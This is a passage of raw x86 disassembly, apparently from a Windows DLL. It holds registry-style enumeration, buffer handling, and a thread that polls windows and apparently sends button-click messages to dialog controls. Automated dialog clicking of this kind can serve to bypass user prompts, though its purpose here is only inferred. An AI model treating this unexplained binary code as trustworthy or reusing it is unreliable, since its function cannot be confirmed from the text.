1000b757:	ff 15 10 e0 00 10    	call   *0x1000e010
1000b75d:	85 c0                	test   %eax,%eax
1000b75f:	74 04                	je     0x1000b765
1000b761:	33 c0                	xor    %eax,%eax
1000b763:	eb 4c                	jmp    0x1000b7b1
1000b765:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
1000b769:	be 2c f2 00 10       	mov    $0x1000f22c,%esi
1000b76e:	8d 7d ec             	lea    -0x14(%ebp),%edi
1000b771:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000b772:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000b775:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000b778:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
1000b77a:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000b77d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000b780:	83 ec 10             	sub    $0x10,%esp
1000b783:	8b fc                	mov    %esp,%edi
1000b785:	ff 75 fc             	pushl  -0x4(%ebp)
1000b788:	89 5d dc             	mov    %ebx,-0x24(%ebp)
1000b78b:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000b78e:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000b791:	8d 75 dc             	lea    -0x24(%ebp),%esi
1000b794:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000b795:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000b796:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000b797:	53                   	push   %ebx
1000b798:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
1000b79f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1000b7a0:	e8 e2 00 00 00       	call   0x1000b887
1000b7a5:	ff 75 fc             	pushl  -0x4(%ebp)
1000b7a8:	ff 15 24 e0 00 10    	call   *0x1000e024
1000b7ae:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000b7b1:	5f                   	pop    %edi
1000b7b2:	5e                   	pop    %esi
1000b7b3:	c9                   	leave  
1000b7b4:	c3                   	ret    
1000b7b5:	55                   	push   %ebp
1000b7b6:	8b ec                	mov    %esp,%ebp
1000b7b8:	53                   	push   %ebx
1000b7b9:	8b d8                	mov    %eax,%ebx
1000b7bb:	8b cb                	mov    %ebx,%ecx
1000b7bd:	33 c0                	xor    %eax,%eax
1000b7bf:	d1 e9                	shr    %ecx
1000b7c1:	56                   	push   %esi
1000b7c2:	74 14                	je     0x1000b7d8
1000b7c4:	8b 55 08             	mov    0x8(%ebp),%edx
1000b7c7:	66 83 3c 42 00       	cmpw   $0x0,(%edx,%eax,2)
1000b7cc:	74 07                	je     0x1000b7d5
1000b7ce:	40                   	inc    %eax
1000b7cf:	3b c1                	cmp    %ecx,%eax
1000b7d1:	72 f1                	jb     0x1000b7c4
1000b7d3:	eb 03                	jmp    0x1000b7d8
1000b7d5:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
1000b7d8:	8b 47 08             	mov    0x8(%edi),%eax
1000b7db:	8b 00                	mov    (%eax),%eax
1000b7dd:	8b 4f 04             	mov    0x4(%edi),%ecx
1000b7e0:	03 01                	add    (%ecx),%eax
1000b7e2:	8b 37                	mov    (%edi),%esi
1000b7e4:	03 c3                	add    %ebx,%eax
1000b7e6:	39 46 10             	cmp    %eax,0x10(%esi)
1000b7e9:	73 09                	jae    0x1000b7f4
1000b7eb:	e8 48 00 00 00       	call   0x1000b838
1000b7f0:	84 c0                	test   %al,%al
1000b7f2:	74 3e                	je     0x1000b832
1000b7f4:	8b 07                	mov    (%edi),%eax
1000b7f6:	8b 4f 04             	mov    0x4(%edi),%ecx
1000b7f9:	8b 40 0c             	mov    0xc(%eax),%eax
1000b7fc:	03 01                	add    (%ecx),%eax
1000b7fe:	53                   	push   %ebx
1000b7ff:	ff 75 08             	pushl  0x8(%ebp)
1000b802:	50                   	push   %eax
1000b803:	e8 08 25 00 00       	call   0x1000dd10
1000b808:	8b 47 04             	mov    0x4(%edi),%eax
1000b80b:	01 18                	add    %ebx,(%eax)
1000b80d:	8b 47 08             	mov    0x8(%edi),%eax
1000b810:	ff 30                	pushl  (%eax)
1000b812:	8b 07                	mov    (%edi),%eax
1000b814:	8b 4f 04             	mov    0x4(%edi),%ecx
1000b817:	8b 40 0c             	mov    0xc(%eax),%eax
1000b81a:	ff 77 0c             	pushl  0xc(%edi)
1000b81d:	03 01                	add    (%ecx),%eax
1000b81f:	50                   	push   %eax
1000b820:	e8 eb 24 00 00       	call   0x1000dd10
1000b825:	8b 4f 08             	mov    0x8(%edi),%ecx
1000b828:	8b 47 04             	mov    0x4(%edi),%eax
1000b82b:	8b 09                	mov    (%ecx),%ecx
1000b82d:	83 c4 18             	add    $0x18,%esp
1000b830:	01 08                	add    %ecx,(%eax)
1000b832:	5e                   	pop    %esi
1000b833:	5b                   	pop    %ebx
1000b834:	5d                   	pop    %ebp
1000b835:	c2 04 00             	ret    $0x4
1000b838:	8b 46 10             	mov    0x10(%esi),%eax
1000b83b:	53                   	push   %ebx
1000b83c:	57                   	push   %edi
1000b83d:	bf 00 04 00 00       	mov    $0x400,%edi
1000b842:	03 c7                	add    %edi,%eax
1000b844:	50                   	push   %eax
1000b845:	e8 9a b1 ff ff       	call   0x100069e4
1000b84a:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
1000b84e:	59                   	pop    %ecx
1000b84f:	8b d8                	mov    %eax,%ebx
1000b851:	74 2f                	je     0x1000b882
1000b853:	01 7e 10             	add    %edi,0x10(%esi)
1000b856:	ff 76 10             	pushl  0x10(%esi)
1000b859:	6a 00                	push   $0x0
1000b85b:	53                   	push   %ebx
1000b85c:	e8 c9 24 00 00       	call   0x1000dd2a
1000b861:	8b 46 10             	mov    0x10(%esi),%eax
1000b864:	2b c7                	sub    %edi,%eax
1000b866:	50                   	push   %eax
1000b867:	ff 76 0c             	pushl  0xc(%esi)
1000b86a:	53                   	push   %ebx
1000b86b:	e8 a0 24 00 00       	call   0x1000dd10
1000b870:	ff 76 0c             	pushl  0xc(%esi)
1000b873:	e8 9b b1 ff ff       	call   0x10006a13
1000b878:	83 c4 1c             	add    $0x1c,%esp
1000b87b:	89 5e 0c             	mov    %ebx,0xc(%esi)
1000b87e:	b0 01                	mov    $0x1,%al
1000b880:	eb 02                	jmp    0x1000b884
1000b882:	32 c0                	xor    %al,%al
1000b884:	5f                   	pop    %edi
1000b885:	5b                   	pop    %ebx
1000b886:	c3                   	ret    
1000b887:	55                   	push   %ebp
1000b888:	8b ec                	mov    %esp,%ebp
1000b88a:	81 ec 0c 0a 00 00    	sub    $0xa0c,%esp
1000b890:	56                   	push   %esi
1000b891:	33 f6                	xor    %esi,%esi
1000b893:	56                   	push   %esi
1000b894:	56                   	push   %esi
1000b895:	56                   	push   %esi
1000b896:	56                   	push   %esi
1000b897:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b89a:	50                   	push   %eax
1000b89b:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
1000b8a1:	50                   	push   %eax
1000b8a2:	56                   	push   %esi
1000b8a3:	ff 75 0c             	pushl  0xc(%ebp)
1000b8a6:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000b8a9:	c7 45 fc 00 01 00 00 	movl   $0x100,-0x4(%ebp)
1000b8b0:	ff 15 0c e0 00 10    	call   *0x1000e00c
1000b8b6:	85 c0                	test   %eax,%eax
1000b8b8:	75 7c                	jne    0x1000b936
1000b8ba:	53                   	push   %ebx
1000b8bb:	57                   	push   %edi
1000b8bc:	8d 85 f4 f5 ff ff    	lea    -0xa0c(%ebp),%eax
1000b8c2:	50                   	push   %eax
1000b8c3:	8b 45 08             	mov    0x8(%ebp),%eax
1000b8c6:	ff 70 08             	pushl  0x8(%eax)
1000b8c9:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
1000b8cf:	50                   	push   %eax
1000b8d0:	ff 75 0c             	pushl  0xc(%ebp)
1000b8d3:	8d 5d f4             	lea    -0xc(%ebp),%ebx
1000b8d6:	c7 45 f4 00 04 00 00 	movl   $0x400,-0xc(%ebp)
1000b8dd:	e8 fc a1 ff ff       	call   0x10005ade
1000b8e2:	83 c4 10             	add    $0x10,%esp
1000b8e5:	8d 7d 10             	lea    0x10(%ebp),%edi
1000b8e8:	85 c0                	test   %eax,%eax
1000b8ea:	74 0d                	je     0x1000b8f9
1000b8ec:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000b8ef:	03 c0                	add    %eax,%eax
1000b8f1:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
1000b8f7:	eb 0c                	jmp    0x1000b905
1000b8f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000b8fc:	83 c0 fe             	add    $0xfffffffe,%eax
1000b8ff:	8d 8d f4 f5 ff ff    	lea    -0xa0c(%ebp),%ecx
1000b905:	51                   	push   %ecx
1000b906:	e8 aa fe ff ff       	call   0x1000b7b5
1000b90b:	ff 45 f8             	incl   -0x8(%ebp)
1000b90e:	56                   	push   %esi
1000b90f:	56                   	push   %esi
1000b910:	56                   	push   %esi
1000b911:	56                   	push   %esi
1000b912:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000b915:	50                   	push   %eax
1000b916:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
1000b91c:	50                   	push   %eax
1000b91d:	ff 75 f8             	pushl  -0x8(%ebp)
1000b920:	c7 45 fc 00 01 00 00 	movl   $0x100,-0x4(%ebp)
1000b927:	ff 75 0c             	pushl  0xc(%ebp)
1000b92a:	ff 15 0c e0 00 10    	call   *0x1000e00c
1000b930:	85 c0                	test   %eax,%eax
1000b932:	74 88                	je     0x1000b8bc
1000b934:	5f                   	pop    %edi
1000b935:	5b                   	pop    %ebx
1000b936:	5e                   	pop    %esi
1000b937:	c9                   	leave  
1000b938:	c2 18 00             	ret    $0x18
1000b93b:	83 60 08 00          	andl   $0x0,0x8(%eax)
1000b93f:	83 60 0c 00          	andl   $0x0,0xc(%eax)
1000b943:	c3                   	ret    
1000b944:	e8 f2 ff ff ff       	call   0x1000b93b
1000b949:	33 c9                	xor    %ecx,%ecx
1000b94b:	66 89 48 10          	mov    %cx,0x10(%eax)
1000b94f:	c3                   	ret    
1000b950:	33 c0                	xor    %eax,%eax
1000b952:	39 41 0c             	cmp    %eax,0xc(%ecx)
1000b955:	0f 95 c0             	setne  %al
1000b958:	c3                   	ret    
1000b959:	55                   	push   %ebp
1000b95a:	8b ec                	mov    %esp,%ebp
1000b95c:	51                   	push   %ecx
1000b95d:	8b 46 04             	mov    0x4(%esi),%eax
1000b960:	85 c0                	test   %eax,%eax
1000b962:	74 2c                	je     0x1000b990
1000b964:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000b968:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1000b96b:	51                   	push   %ecx
1000b96c:	50                   	push   %eax
1000b96d:	ff 15 d0 e0 00 10    	call   *0x1000e0d0
1000b973:	85 c0                	test   %eax,%eax
1000b975:	74 19                	je     0x1000b990
1000b977:	81 7d fc 03 01 00 00 	cmpl   $0x103,-0x4(%ebp)
1000b97e:	74 10                	je     0x1000b990
1000b980:	ff 76 04             	pushl  0x4(%esi)
1000b983:	ff 15 50 e1 00 10    	call   *0x1000e150
1000b989:	83 66 04 00          	andl   $0x0,0x4(%esi)
1000b98d:	83 26 00             	andl   $0x0,(%esi)
1000b990:	8b 06                	mov    (%esi),%eax
1000b992:	c9                   	leave  
1000b993:	c3                   	ret    
1000b994:	55                   	push   %ebp
1000b995:	8b ec                	mov    %esp,%ebp
1000b997:	8b 46 08             	mov    0x8(%esi),%eax
1000b99a:	85 c0                	test   %eax,%eax
1000b99c:	74 07                	je     0x1000b9a5
1000b99e:	50                   	push   %eax
1000b99f:	e8 6f b0 ff ff       	call   0x10006a13
1000b9a4:	59                   	pop    %ecx
1000b9a5:	57                   	push   %edi
1000b9a6:	e8 39 b0 ff ff       	call   0x100069e4
1000b9ab:	59                   	pop    %ecx
1000b9ac:	89 46 08             	mov    %eax,0x8(%esi)
1000b9af:	85 c0                	test   %eax,%eax
1000b9b1:	74 13                	je     0x1000b9c6
1000b9b3:	57                   	push   %edi
1000b9b4:	ff 75 08             	pushl  0x8(%ebp)
1000b9b7:	89 7e 0c             	mov    %edi,0xc(%esi)
1000b9ba:	50                   	push   %eax
1000b9bb:	e8 50 23 00 00       	call   0x1000dd10
1000b9c0:	33 c0                	xor    %eax,%eax
1000b9c2:	83 c4 0c             	add    $0xc,%esp
1000b9c5:	40                   	inc    %eax
1000b9c6:	5d                   	pop    %ebp
1000b9c7:	c2 04 00             	ret    $0x4
1000b9ca:	6a 00                	push   $0x0
1000b9cc:	ff 76 04             	pushl  0x4(%esi)
1000b9cf:	ff 15 d4 e0 00 10    	call   *0x1000e0d4
1000b9d5:	ff 76 04             	pushl  0x4(%esi)
1000b9d8:	ff 15 50 e1 00 10    	call   *0x1000e150
1000b9de:	c3                   	ret    
1000b9df:	55                   	push   %ebp
1000b9e0:	8b ec                	mov    %esp,%ebp
1000b9e2:	83 ec 10             	sub    $0x10,%esp
1000b9e5:	53                   	push   %ebx
1000b9e6:	33 db                	xor    %ebx,%ebx
1000b9e8:	56                   	push   %esi
1000b9e9:	39 5f 04             	cmp    %ebx,0x4(%edi)
1000b9ec:	74 07                	je     0x1000b9f5
1000b9ee:	8b f7                	mov    %edi,%esi
1000b9f0:	e8 d5 ff ff ff       	call   0x1000b9ca
1000b9f5:	8b 75 08             	mov    0x8(%ebp),%esi
1000b9f8:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000b9fb:	50                   	push   %eax
1000b9fc:	ff 75 0c             	pushl  0xc(%ebp)
1000b9ff:	e8 7f 22 00 00       	call   0x1000dc83
1000ba04:	85 c0                	test   %eax,%eax
1000ba06:	74 17                	je     0x1000ba1f
1000ba08:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000ba0b:	ff 75 f4             	pushl  -0xc(%ebp)
1000ba0e:	89 07                	mov    %eax,(%edi)
1000ba10:	8b 45 f0             	mov    -0x10(%ebp),%eax
1000ba13:	89 47 04             	mov    %eax,0x4(%edi)
1000ba16:	ff 15 50 e1 00 10    	call   *0x1000e150
1000ba1c:	33 db                	xor    %ebx,%ebx
1000ba1e:	43                   	inc    %ebx
1000ba1f:	5e                   	pop    %esi
1000ba20:	8b c3                	mov    %ebx,%eax
1000ba22:	5b                   	pop    %ebx
1000ba23:	c9                   	leave  
1000ba24:	c2 08 00             	ret    $0x8
1000ba27:	83 f9 01             	cmp    $0x1,%ecx
1000ba2a:	75 04                	jne    0x1000ba30
1000ba2c:	83 c0 14             	add    $0x14,%eax
1000ba2f:	c3                   	ret    
1000ba30:	83 f9 02             	cmp    $0x2,%ecx
1000ba33:	74 14                	je     0x1000ba49
1000ba35:	83 f9 03             	cmp    $0x3,%ecx
1000ba38:	75 04                	jne    0x1000ba3e
1000ba3a:	83 c0 28             	add    $0x28,%eax
1000ba3d:	c3                   	ret    
1000ba3e:	83 f9 04             	cmp    $0x4,%ecx
1000ba41:	75 04                	jne    0x1000ba47
1000ba43:	83 c0 38             	add    $0x38,%eax
1000ba46:	c3                   	ret    
1000ba47:	33 c0                	xor    %eax,%eax
1000ba49:	c3                   	ret    
1000ba4a:	55                   	push   %ebp
1000ba4b:	8b ec                	mov    %esp,%ebp
1000ba4d:	51                   	push   %ecx
1000ba4e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000ba52:	56                   	push   %esi
1000ba53:	8b f7                	mov    %edi,%esi
1000ba55:	e8 ff fe ff ff       	call   0x1000b959
1000ba5a:	3b c3                	cmp    %ebx,%eax
1000ba5c:	75 07                	jne    0x1000ba65
1000ba5e:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
1000ba65:	8d 77 14             	lea    0x14(%edi),%esi
1000ba68:	e8 ec fe ff ff       	call   0x1000b959
1000ba6d:	3b c3                	cmp    %ebx,%eax
1000ba6f:	75 07                	jne    0x1000ba78
1000ba71:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000ba78:	8d 77 28             	lea    0x28(%edi),%esi
1000ba7b:	e8 d9 fe ff ff       	call   0x1000b959
1000ba80:	3b c3                	cmp    %ebx,%eax
1000ba82:	75 07                	jne    0x1000ba8b
1000ba84:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
1000ba8b:	8d 77 38             	lea    0x38(%edi),%esi
1000ba8e:	e8 c6 fe ff ff       	call   0x1000b959
1000ba93:	5e                   	pop    %esi
1000ba94:	3b c3                	cmp    %ebx,%eax
1000ba96:	75 07                	jne    0x1000ba9f
1000ba98:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
1000ba9f:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000baa2:	c9                   	leave  
1000baa3:	c3                   	ret    
1000baa4:	8b c2                	mov    %edx,%eax
1000baa6:	e8 99 fe ff ff       	call   0x1000b944
1000baab:	8d 42 14             	lea    0x14(%edx),%eax
1000baae:	e8 91 fe ff ff       	call   0x1000b944
1000bab3:	8d 42 28             	lea    0x28(%edx),%eax
1000bab6:	e8 80 fe ff ff       	call   0x1000b93b
1000babb:	8d 42 38             	lea    0x38(%edx),%eax
1000babe:	e8 81 fe ff ff       	call   0x1000b944
1000bac3:	8b c2                	mov    %edx,%eax
1000bac5:	c3                   	ret    
1000bac6:	55                   	push   %ebp
1000bac7:	8b ec                	mov    %esp,%ebp
1000bac9:	83 f9 02             	cmp    $0x2,%ecx
1000bacc:	74 09                	je     0x1000bad7
1000bace:	83 f9 01             	cmp    $0x1,%ecx
1000bad1:	74 04                	je     0x1000bad7
1000bad3:	33 c0                	xor    %eax,%eax
1000bad5:	eb 0c                	jmp    0x1000bae3
1000bad7:	8b 45 08             	mov    0x8(%ebp),%eax
1000bada:	e8 48 ff ff ff       	call   0x1000ba27
1000badf:	66 8b 40 10          	mov    0x10(%eax),%ax
1000bae3:	5d                   	pop    %ebp
1000bae4:	c2 04 00             	ret    $0x4
1000bae7:	55                   	push   %ebp
1000bae8:	8b ec                	mov    %esp,%ebp
1000baea:	ff 75 0c             	pushl  0xc(%ebp)
1000baed:	ff 75 08             	pushl  0x8(%ebp)
1000baf0:	e8 32 ff ff ff       	call   0x1000ba27
1000baf5:	e8 04 00 00 00       	call   0x1000bafe
1000bafa:	5d                   	pop    %ebp
1000bafb:	c2 08 00             	ret    $0x8
1000bafe:	55                   	push   %ebp
1000baff:	8b ec                	mov    %esp,%ebp
1000bb01:	8b 48 0c             	mov    0xc(%eax),%ecx
1000bb04:	56                   	push   %esi
1000bb05:	33 f6                	xor    %esi,%esi
1000bb07:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
1000bb0a:	72 11                	jb     0x1000bb1d
1000bb0c:	8b f1                	mov    %ecx,%esi
1000bb0e:	56                   	push   %esi
1000bb0f:	ff 70 08             	pushl  0x8(%eax)
1000bb12:	ff 75 08             	pushl  0x8(%ebp)
1000bb15:	e8 f6 21 00 00       	call   0x1000dd10
1000bb1a:	83 c4 0c             	add    $0xc,%esp
1000bb1d:	8b c6                	mov    %esi,%eax
1000bb1f:	5e                   	pop    %esi
1000bb20:	5d                   	pop    %ebp
1000bb21:	c2 08 00             	ret    $0x8
1000bb24:	6a 4c                	push   $0x4c
1000bb26:	e8 b9 ae ff ff       	call   0x100069e4
1000bb2b:	59                   	pop    %ecx
1000bb2c:	c3                   	ret    
1000bb2d:	55                   	push   %ebp
1000bb2e:	8b ec                	mov    %esp,%ebp
1000bb30:	8b 45 0c             	mov    0xc(%ebp),%eax
1000bb33:	83 e8 00             	sub    $0x0,%eax
1000bb36:	74 0e                	je     0x1000bb46
1000bb38:	48                   	dec    %eax
1000bb39:	75 10                	jne    0x1000bb4b
1000bb3b:	ff 75 08             	pushl  0x8(%ebp)
1000bb3e:	e8 24 19 00 00       	call   0x1000d467
1000bb43:	59                   	pop    %ecx
1000bb44:	eb 05                	jmp    0x1000bb4b
1000bb46:	e8 7a 19 00 00       	call   0x1000d4c5
1000bb4b:	33 c0                	xor    %eax,%eax
1000bb4d:	40                   	inc    %eax
1000bb4e:	5d                   	pop    %ebp
1000bb4f:	c2 0c 00             	ret    $0xc
1000bb52:	ff 05 80 38 01 10    	incl   0x10013880
1000bb58:	33 c0                	xor    %eax,%eax
1000bb5a:	40                   	inc    %eax
1000bb5b:	c2 08 00             	ret    $0x8
1000bb5e:	55                   	push   %ebp
1000bb5f:	8b ec                	mov    %esp,%ebp
1000bb61:	6a f0                	push   $0xfffffff0
1000bb63:	ff 75 08             	pushl  0x8(%ebp)
1000bb66:	ff 15 ac e1 00 10    	call   *0x1000e1ac
1000bb6c:	3d 03 24 01 50       	cmp    $0x50012403,%eax
1000bb71:	75 38                	jne    0x1000bbab
1000bb73:	53                   	push   %ebx
1000bb74:	56                   	push   %esi
1000bb75:	8b 35 b8 e1 00 10    	mov    0x1000e1b8,%esi
1000bb7b:	57                   	push   %edi
1000bb7c:	33 db                	xor    %ebx,%ebx
1000bb7e:	bf f0 00 00 00       	mov    $0xf0,%edi
1000bb83:	eb 16                	jmp    0x1000bb9b
1000bb85:	ff 75 08             	pushl  0x8(%ebp)
1000bb88:	ff 15 c4 e1 00 10    	call   *0x1000e1c4
1000bb8e:	53                   	push   %ebx
1000bb8f:	6a 01                	push   $0x1
1000bb91:	68 f5 00 00 00       	push   $0xf5
1000bb96:	ff 75 08             	pushl  0x8(%ebp)
1000bb99:	ff d6                	call   *%esi
1000bb9b:	53                   	push   %ebx
1000bb9c:	53                   	push   %ebx
1000bb9d:	57                   	push   %edi
1000bb9e:	ff 75 08             	pushl  0x8(%ebp)
1000bba1:	ff d6                	call   *%esi
1000bba3:	83 f8 01             	cmp    $0x1,%eax
1000bba6:	75 dd                	jne    0x1000bb85
1000bba8:	5f                   	pop    %edi
1000bba9:	5e                   	pop    %esi
1000bbaa:	5b                   	pop    %ebx
1000bbab:	33 c0                	xor    %eax,%eax
1000bbad:	40                   	inc    %eax
1000bbae:	5d                   	pop    %ebp
1000bbaf:	c2 08 00             	ret    $0x8
1000bbb2:	55                   	push   %ebp
1000bbb3:	8b ec                	mov    %esp,%ebp
1000bbb5:	83 ec 3c             	sub    $0x3c,%esp
1000bbb8:	56                   	push   %esi
1000bbb9:	8b 75 08             	mov    0x8(%ebp),%esi
1000bbbc:	6a f0                	push   $0xfffffff0
1000bbbe:	56                   	push   %esi
1000bbbf:	ff 15 ac e1 00 10    	call   *0x1000e1ac
1000bbc5:	3d 00 00 01 50       	cmp    $0x50010000,%eax
1000bbca:	75 38                	jne    0x1000bc04
1000bbcc:	8d 45 c4             	lea    -0x3c(%ebp),%eax
1000bbcf:	50                   	push   %eax
1000bbd0:	56                   	push   %esi
1000bbd1:	ff 15 b0 e1 00 10    	call   *0x1000e1b0
1000bbd7:	b8 17 c0 00 00       	mov    $0xc017,%eax
1000bbdc:	66 39 45 fc          	cmp    %ax,-0x4(%ebp)
1000bbe0:	75 22                	jne    0x1000bc04
1000bbe2:	56                   	push   %esi
1000bbe3:	ff 15 bc e1 00 10    	call   *0x1000e1bc
1000bbe9:	50                   	push   %eax
1000bbea:	ff 15 c4 e1 00 10    	call   *0x1000e1c4
1000bbf0:	6a 00                	push   $0x0
1000bbf2:	6a 00                	push   $0x0
1000bbf4:	68 f5 00 00 00       	push   $0xf5
1000bbf9:	56                   	push   %esi
1000bbfa:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
1000bc00:	33 c0                	xor    %eax,%eax
1000bc02:	eb 03                	jmp    0x1000bc07
1000bc04:	33 c0                	xor    %eax,%eax
1000bc06:	40                   	inc    %eax
1000bc07:	5e                   	pop    %esi
1000bc08:	c9                   	leave  
1000bc09:	c2 08 00             	ret    $0x8
1000bc0c:	55                   	push   %ebp
1000bc0d:	8b ec                	mov    %esp,%ebp
1000bc0f:	51                   	push   %ecx
1000bc10:	53                   	push   %ebx
1000bc11:	8b 1d 40 e1 00 10    	mov    0x1000e140,%ebx
1000bc17:	56                   	push   %esi
1000bc18:	57                   	push   %edi
1000bc19:	ff d3                	call   *%ebx
1000bc1b:	8b 35 d0 e1 00 10    	mov    0x1000e1d0,%esi
1000bc21:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000bc24:	6a 00                	push   $0x0
1000bc26:	68 34 f2 00 10       	push   $0x1000f234
1000bc2b:	ff 15 a8 e1 00 10    	call   *0x1000e1a8
1000bc31:	8b f8                	mov    %eax,%edi
1000bc33:	85 ff                	test   %edi,%edi
1000bc35:	74 1a                	je     0x1000bc51
1000bc37:	83 25 80 38 01 10 00 	andl   $0x0,0x10013880
1000bc3e:	6a 00                	push   $0x0
1000bc40:	68 52 bb 00 10       	push   $0x1000bb52
1000bc45:	57                   	push   %edi
1000bc46:	ff d6                	call   *%esi
1000bc48:	83 3d 80 38 01 10 17 	cmpl   $0x17,0x10013880
1000bc4f:	74 24                	je     0x1000bc75
1000bc51:	ff d3                	call   *%ebx
1000bc53:	68 fa 00 00 00       	push   $0xfa
1000bc58:	8b f8                	mov    %eax,%edi
1000bc5a:	ff 15 44 e1 00 10    	call   *0x1000e144
1000bc60:	8b c7                	mov    %edi,%eax
1000bc62:	2b 45 fc             	sub    -0x4(%ebp),%eax
1000bc65:	33 d2                	xor    %edx,%edx
1000bc67:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
1000bc6c:	f7 f1                	div    %ecx
1000bc6e:	83 f8 3c             	cmp    $0x3c,%eax
1000bc71:	72 b1                	jb     0x1000bc24
1000bc73:	eb 1b                	jmp    0x1000bc90
1000bc75:	6a 00                	push   $0x0
1000bc77:	68 5e bb 00 10       	push   $0x1000bb5e
1000bc7c:	57                   	push   %edi
1000bc7d:	ff d6                	call   *%esi
1000bc7f:	57                   	push   %edi
1000bc80:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000bc86:	6a 00                	push   $0x0
1000bc88:	68 b2 bb 00 10       	push   $0x1000bbb2
1000bc8d:	57                   	push   %edi
1000bc8e:	ff d6                	call   *%esi
1000bc90:	5f                   	pop    %edi
1000bc91:	5e                   	pop    %esi
1000bc92:	33 c0                	xor    %eax,%eax
1000bc94:	5b                   	pop    %ebx
1000bc95:	c9                   	leave  
1000bc96:	c2 04 00             	ret    $0x4
1000bc99:	55                   	push   %ebp
1000bc9a:	8b ec                	mov    %esp,%ebp
1000bc9c:	51                   	push   %ecx
1000bc9d:	56                   	push   %esi
1000bc9e:	33 f6                	xor    %esi,%esi
1000bca0:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000bca3:	50                   	push   %eax
1000bca4:	56                   	push   %esi
1000bca5:	56                   	push   %esi
1000bca6:	68 0c bc 00 10       	push   $0x1000bc0c
1000bcab:	56                   	push   %esi
1000bcac:	56                   	push   %esi
1000bcad:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000bcb0:	ff 15 54 e1 00 10    	call   *0x1000e154
1000bcb6:	50                   	push   %eax
1000bcb7:	ff 15 50 e1 00 10    	call   *0x1000e150
1000bcbd:	33 c0                	xor    %eax,%eax
1000bcbf:	39 75 fc             	cmp    %esi,-0x4(%ebp)
1000bcc2:	5e                   	pop    %esi
1000bcc3:	0f 95 c0             	setne  %al
1000bcc6:	c9                   	leave  
1000bcc7:	c3                   	ret    
1000bcc8:	55                   	push   %ebp
1000bcc9:	8b ec                	mov    %esp,%ebp
1000bccb:	57                   	push   %edi
1000bccc:	8b f8                	mov    %eax,%edi
1000bcce:	8b 46 08             	mov    0x8(%esi),%eax
1000bcd1:	03 c7                	add    %edi,%eax
1000bcd3:	3b 46 04             	cmp    0x4(%esi),%eax
1000bcd6:	76 29                	jbe    0x1000bd01
1000bcd8:	53                   	push   %ebx
1000bcd9:	bb 00 20 00 00       	mov    $0x2000,%ebx
1000bcde:	8b 46 04             	mov    0x4(%esi),%eax
1000bce1:	03 c3                	add    %ebx,%eax
1000bce3:	50                   	push   %eax
1000bce4:	ff 36                	pushl  (%esi)
1000bce6:	e8 0f ad ff ff       	call   0x100069fa
1000bceb:	59                   	pop    %ecx
1000bcec:	59                   	pop    %ecx
1000bced:	85 c0                	test   %eax,%eax
1000bcef:	74 05                	je     0x1000bcf6
1000bcf1:	01 5e 04             	add    %ebx,0x4(%esi)
1000bcf4:	89 06                	mov    %eax,(%esi)
1000bcf6:	8b 46 08             	mov    0x8(%esi),%eax
1000bcf9:	03 c7                	add    %edi,%eax
1000bcfb:	3b 46 04             	cmp    0x4(%esi),%eax
1000bcfe:	77 de                	ja     0x1000bcde
1000bd00:	5b                   	pop    %ebx
1000bd01:	8b 4e 08             	mov    0x8(%esi),%ecx
1000bd04:	8b 06                	mov    (%esi),%eax
1000bd06:	8b 55 08             	mov    0x8(%ebp),%edx
1000bd09:	03 c1                	add    %ecx,%eax
1000bd0b:	03 cf                	add    %edi,%ecx
1000bd0d:	89 4e 08             	mov    %ecx,0x8(%esi)
1000bd10:	85 ff                	test   %edi,%edi
1000bd12:	74 0b                	je     0x1000bd1f
1000bd14:	2b c2                	sub    %edx,%eax
1000bd16:	8a 0a                	mov    (%edx),%cl
1000bd18:	88 0c 10             	mov    %cl,(%eax,%edx,1)
1000bd1b:	42                   	inc    %edx
1000bd1c:	4f                   	dec    %edi
1000bd1d:	75 f7                	jne    0x1000bd16
1000bd1f:	5f                   	pop    %edi
1000bd20:	5d                   	pop    %ebp
1000bd21:	c2 04 00             	ret    $0x4
1000bd24:	55                   	push   %ebp
1000bd25:	8b ec                	mov    %esp,%ebp
1000bd27:	83 60 08 00          	andl   $0x0,0x8(%eax)
1000bd2b:	6a 00                	push   $0x0
1000bd2d:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
